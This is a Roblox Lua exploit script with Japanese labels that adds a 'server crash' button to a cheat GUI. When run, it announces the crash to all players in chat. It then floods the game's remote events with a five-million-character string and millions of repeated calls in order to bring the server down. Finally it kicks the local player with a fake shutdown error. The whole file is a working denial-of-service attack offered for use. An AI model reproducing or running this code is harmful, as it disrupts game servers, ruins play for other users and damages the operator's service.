local serverCrashRunning = false
local serverCrashDownDetected = false

ShibakuGroup:AddLabel("サーバークラッシュ")

ShibakuGroup:AddButton({
	Text = '実行',
	Func = function()
		if serverCrashRunning or serverCrashDownDetected then
			notify("既に実行中です", "Server Crash")
			return
		end

		pcall(function()
			local sent = false
			local chatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
			local sayRequest = chatEvents and chatEvents:FindFirstChild("SayMessageRequest")
			if sayRequest then
				pcall(function()
					sayRequest:FireServer("サーバクラッシュが実行されました⚠️", "All")
				end)
				sent = true
			end
			if not sent then
				pcall(function()
					local tcs = game:GetService("TextChatService")
					local channels = tcs and tcs:FindFirstChild("TextChannels")
					local rb = channels and channels:FindFirstChild("RBXGeneral")
					if rb then
						rb:SendAsync("サーバクラッシュが実行されました⚠️")
					end
				end)
			end
		end)

		notify("実行中...", "Server Crash")
		serverCrashRunning = true

		task.spawn(function()
			local DataEvents = replicatedStorage:WaitForChild("DataEvents", 10)
			local UpdTextures = DataEvents and DataEvents:WaitForChild("UpdateTexturesChoice", 10)
			local DataRemote = DataEvents and DataEvents:WaitForChild("DataRemoteEvent", 10)

			if not UpdTextures or not DataRemote then
				notify("必要なリモートが見つかりません", "Server Crash")
				serverCrashRunning = false
				return
			end

			task.spawn(function()
				local CHECK_INTERVAL = 0.1
				local STILL_LIMIT = 2.5
				local MOVE_THRESHOLD = 0.5
				local lastPositions = {}
				local stillTime = 0

				while not serverCrashDownDetected do
					task.wait(CHECK_INTERVAL)
					local moved = false
					local others = 0

					for _, p in ipairs(Players:GetPlayers()) do
						if p ~= localPlayer then
							local char = p.Character
							local hrp = char and char:FindFirstChild("HumanoidRootPart")
							if hrp then
								others += 1
								local last = lastPositions[p.UserId]
								if not last or (hrp.Position - last).Magnitude > MOVE_THRESHOLD then
									moved = true
								end
								lastPositions[p.UserId] = hrp.Position
							end
						end
					end

					if others >= 1 then
						if moved then
							stillTime = 0
						else
							stillTime += CHECK_INTERVAL
							if stillTime >= STILL_LIMIT then
								serverCrashDownDetected = true
								pcall(function()
									localPlayer:Kick("Disconnected from the experience. The server has shut down. (Error Code: 288)")
								end)
								return
							end
						end
					else
						stillTime = 0
					end
				end
			end)

			pcall(function() UpdTextures:FireServer(string.rep("A", 5000000)) end)
			for i = 1, 5000000 do
				if serverCrashDownDetected then break end
				pcall(function() DataRemote:FireServer() end)
				if i % 5000 == 0 then
					task.wait()
				end
			end

			serverCrashRunning = false
		end)
	end,
})

